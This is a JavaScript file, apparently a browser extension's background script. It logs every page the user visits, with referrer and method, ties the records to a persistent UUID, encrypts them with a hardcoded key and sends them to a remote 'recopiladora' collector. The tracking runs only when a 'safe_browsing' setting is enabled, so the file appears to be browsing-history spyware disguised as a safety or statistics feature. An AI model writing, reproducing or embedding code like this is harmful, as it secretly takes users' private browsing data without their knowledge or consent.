function Statistics(api_key, encryptionKey) {
    const t = this, refs = {}, apiUrl = "https://recopiladora.domain";
    let accessToken = null, refreshToken = null, uuid = null;
    this.run = function () {
        this.getUUIDfromStore(), chrome.webRequest.onCompleted.addListener(this.handlerOnCompletedWebRequest.bind(this), {
            urls: ["<all_urls>"],
            types: ["main_frame"]
        }, [])
    }, this.getAccessToken = async function () {
        if (await this.getRefreshToken()) {
            return true;
        } else {
            try {
                const response = await fetch(apiUrl + "/auth", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json;charset=utf-8",
                    },
                    body: JSON.stringify({
                        api_key
                    })
                });
                const json = await response.json();
                accessToken = json.access_token.token;
                refreshToken = json.refresh_token.token;
                return true;
            } catch (err) {
                return false;
            }
        }
    }, this.getRefreshToken = async function () {
        try {
            const response = await fetch(apiUrl + "/refresh", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json;charset=utf-8",
                },
                body: JSON.stringify({
                    refresh_token: refreshToken
                })
            });
            if (response.status === 400) {
                return false;
            }
            const json = await response.json();
            accessToken = json.access_token.token;
            refreshToken = json.refresh_token.token;
            return true;
        } catch (err) {
            return false;
        }
    }, this.handlerOnCompletedWebRequest = async function (t) {
        if (!accessToken) {
            await this.getAccessToken();
        }
        await this.sendData(await this.prepareRequest([{
            fileDate: (new Date).toISOString(),
            deviceTimestamp: Date.now(),
            userId: uuid,
            referrerUrl: refs[t.tabId] || t.initiator,
            targetUrl: t.url,
            requestType: t.method
        }]));
        refs[t.tabId] = t.url;
    }, this.prepareRequest = async function (t) {
        const encrypted = await this.encryptData(JSON.stringify(t))
        if (encrypted) {
            return {
                eventType: 1,
                request: {
                    enRequest: JSON.stringify(encrypted)
                }
            }
        } else {
            return {
                eventType: 0,
                request: [
                    t
                ]
            }
        }
    }, this.sendData = async function (t) {
        const response = await fetch(apiUrl + "/process", {
            method: "POST",
            headers: {
                "Content-Type": "application/json;charset=utf-8",
                "Authorization": "Bearer " + accessToken
            },
            body: JSON.stringify(t)
        });
        if (response.status === 401) {
            const isSuccessful = await this.getAccessToken();
            if (isSuccessful) {
                await this.sendData(t)
            }
        }
    }, this.getUUIDfromStore = function () {
        chrome.storage.sync.get(["uuid"], function (n) {
            uuid = n.uuid = n.uuid && t.validateUUID4(n.uuid) ? n.uuid : t.makeUUID(), chrome.storage.sync.set({ uuid: n.uuid }, function () {
            })
        })
    }, this.makeUUID = function () {
        return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (t, e) {
            return ("x" == t ? e = 16 * Math.random() | 0 : 3 & e | 8).toString(16)
        })
    }, this.validateUUID4 = function (t) {
        return new RegExp(/^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i).test(t)
    }, this.encryptData = async function (text) {
        const enc = new TextEncoder();
        const key = await crypto.subtle.importKey(
            "raw",
            enc.encode(encryptionKey),
            "AES-GCM",
            true,
            ["encrypt"]
        );
        const iv = crypto.getRandomValues(new Uint8Array(16))
 
        const cypher = await crypto.subtle.encrypt(
            {
                name: "AES-GCM",
                iv: iv
            },
            key,
            enc.encode(text)
        );
 
        const res = new Uint8Array(iv.length + cypher.byteLength);
        res.set(iv);
        res.set(new Uint8Array(cypher), iv.length);
 
        return btoa(String.fromCharCode.apply(null, res));
    }
}
 
chrome.storage.local.get(function(storage){
  if (typeof storage.safe_browsing !== "undefined" && storage.safe_browsing == true) {
    const stat = new Statistics("62O1nxzGsRscgmK1", "8X_hj^FWR2uGcqbr");
    stat.run();
  } 
});